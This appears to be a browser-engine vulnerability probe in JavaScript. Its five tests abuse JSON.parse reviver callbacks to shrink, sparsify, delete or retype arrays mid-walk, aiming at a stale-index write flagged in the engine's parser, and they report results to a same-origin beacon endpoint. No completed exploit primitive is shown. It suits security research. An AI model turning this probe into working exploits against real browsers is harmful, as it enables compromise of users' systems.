/*
 * p424 -- JSON.parse reviver callback exploitation
 *
 * Walker::walk caches arrayLength at line 1290 before calling reviver.
 * Reviver can mutate the array. putDirectIndex at line 1327 writes using
 * cached index that may be beyond the array's current length.
 *
 * Also tests: reviver converting array storage type during iteration,
 * and reviver creating typed arrays from the same data.
 *
 * Beacon prefix: V424-
 */
(function(){
"use strict";
var BQ = 0;
function B(tag, data) {
  try {
    var x = new XMLHttpRequest();
    x.open("POST", "/beacon/V424-" + tag + "?q=" + (BQ++), false);
    x.setRequestHeader("Content-Type", "text/plain");
    x.send(typeof data === "object" ? JSON.stringify(data) : String(data || ""));
  } catch(e) {}
}

B("BOOT");

// ================================================================
// Test A: Reviver shrinks array during iteration
// ================================================================

function testA() {
  B("A-START");

  // Create a large JSON array
  var arr = [];
  for (var i = 0; i < 1000; i++) arr.push(i);
  var jsonStr = JSON.stringify(arr);

  var reviverCallCount = 0;
  var maxIndex = 0;
  var shrunkAt = -1;

  var result = JSON.parse(jsonStr, function(key, value) {
    reviverCallCount++;
    var idx = parseInt(key);

    if (!isNaN(idx) && idx > maxIndex) maxIndex = idx;

    // At index 100, shrink the array to length 50
    if (idx === 100 && shrunkAt < 0) {
      shrunkAt = reviverCallCount;
      this.length = 50;
      B("A-SHRUNK", {at: idx, call: reviverCallCount});
    }

    return value;
  });

  B("A-STATS", {
    calls: reviverCallCount,
    maxIdx: maxIndex,
    shrunkAt: shrunkAt,
    resultLen: result.length,
    resultType: typeof result
  });

  // Check what the result array looks like
  var nonUndef = 0;
  var undef = 0;
  for (var i = 0; i < 200; i++) {
    if (result[i] !== undefined) nonUndef++;
    else undef++;
  }
  B("A-CONTENT", {nonUndef: nonUndef, undef: undef});
}

// ================================================================
// Test B: Reviver converts array to sparse (dictionary mode)
// ================================================================

function testB() {
  B("B-START");

  var arr = [];
  for (var i = 0; i < 100; i++) arr.push(i);
  var jsonStr = JSON.stringify(arr);

  var convertedToSparse = false;
  var result = JSON.parse(jsonStr, function(key, value) {
    var idx = parseInt(key);

    // At index 10, make the array sparse by setting a very high index
    if (idx === 10 && !convertedToSparse) {
      convertedToSparse = true;
      this[999999] = 0xDEAD;
      B("B-SPARSE-SET");
    }

    return value;
  });

  B("B-STATS", {
    resultLen: result.length,
    has999999: result[999999] !== undefined,
    val999999: result[999999]
  });
}

// ================================================================
// Test C: Reviver deletes elements and changes structure
// ================================================================

function testC() {
  B("C-START");

  var arr = [];
  for (var i = 0; i < 200; i++) arr.push({val: i, pad: "x".repeat(100)});
  var jsonStr = JSON.stringify(arr);

  var deletedCount = 0;
  var result = JSON.parse(jsonStr, function(key, value) {
    var idx = parseInt(key);

    // Delete elements 50-150 during iteration
    if (idx === 60) {
      for (var d = 0; d < 50; d++) {
        delete this[d];
        deletedCount++;
      }
      // Also set length to 10
      this.length = 10;
      B("C-DELETED", deletedCount);
    }

    // After deletion, reviver still gets called for remaining indices
    // putDirectIndex at those indices writes beyond the shrunk array
    if (idx > 60) {
      // These writes go to indices > 10 on an array with length 10
      // putDirectIndex should handle this by extending the array
      // BUT if the butterfly was reallocated during deletion...
      return {corrupted: idx}; // Return a distinctive value
    }

    return value;
  });

  B("C-RESULT", {
    len: result.length,
    hasIdx70: result[70] !== undefined,
    idx70: result[70] ? JSON.stringify(result[70]).slice(0, 40) : "undef"
  });
}

// ================================================================
// Test D: Reviver replaces array with non-array during object walk
// ================================================================

function testD() {
  B("D-START");

  var data = {list: [1, 2, 3, 4, 5], other: "test"};
  var jsonStr = JSON.stringify(data);

  var result = JSON.parse(jsonStr, function(key, value) {
    // When reviver sees "list", replace it with a typed array view
    if (key === "list" && Array.isArray(value)) {
      var ab = new ArrayBuffer(40);
      var u32 = new Uint32Array(ab);
      for (var i = 0; i < u32.length; i++) u32[i] = 0xBEEF0000 | i;
      return u32;
    }
    return value;
  });

  B("D-RESULT", {
    listType: Object.prototype.toString.call(result.list),
    listLen: result.list.length
  });
}

// ================================================================
// Test E: Nested JSON with reviver modifying parent during child walk
// ================================================================

function testE() {
  B("E-START");

  // Deeply nested structure where reviver modifies ancestors
  var nested = {a: {b: {c: {d: [1,2,3,4,5,6,7,8,9,10]}}}};
  var jsonStr = JSON.stringify(nested);

  var modifications = 0;
  var result = JSON.parse(jsonStr, function(key, value) {
    // When processing deep elements, modify the root
    if (typeof value === "number" && value > 5) {
      // Replace parent objects during deep iteration
      if (this.constructor === Array) {
        // We're inside the array. Delete our own properties.
        for (var k = 0; k < this.length; k++) {
          delete this[k];
        }
        this.length = 0;
        modifications++;
      }
    }
    return value;
  });

  B("E-RESULT", {
    modifications: modifications,
    resultStr: JSON.stringify(result).slice(0, 100)
  });
}

testA();
testB();
testC();
testD();
testE();

B("DONE");
})();
